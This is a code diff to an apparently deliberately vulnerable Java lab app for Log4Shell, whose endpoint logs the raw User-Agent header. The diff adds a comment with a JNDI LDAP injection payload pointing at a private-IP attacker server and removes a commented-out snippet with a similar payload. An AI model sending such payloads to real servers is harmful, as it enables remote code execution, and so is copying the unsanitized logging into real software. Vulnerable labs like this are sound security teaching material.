@@ -17,6 +17,7 @@ public class VulnApp {
     @GET
     // Get the User-Agent header from the request and log it. Here we can pass the jndi:ldap string
     // since it does not get sanitized or checked. 
+    // Example: 'User-Agent: ${jndi:ldap://172.16.10.10:1389/a}'
     public String greetings(@HeaderParam("User-Agent") String userAgent) {
         // Log that User-Agent
         logger.error("User Agent is: " + userAgent);
@@ -24,16 +25,3 @@ public class VulnApp {
 
     }
 }
-
-/* This is a snippet of vulnerable code to log4shell
-public class log4j {
-    private static final Logger logger = LogManager.getLogger(log4j.class);
-
-    public static void main(String[] args) {
-        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-        String userInput = "${jndi:ldap://172.16.68.187:1389/a}";
-
-        logger.error("Log this thing {}", userInput);
-    }
-}
-*/
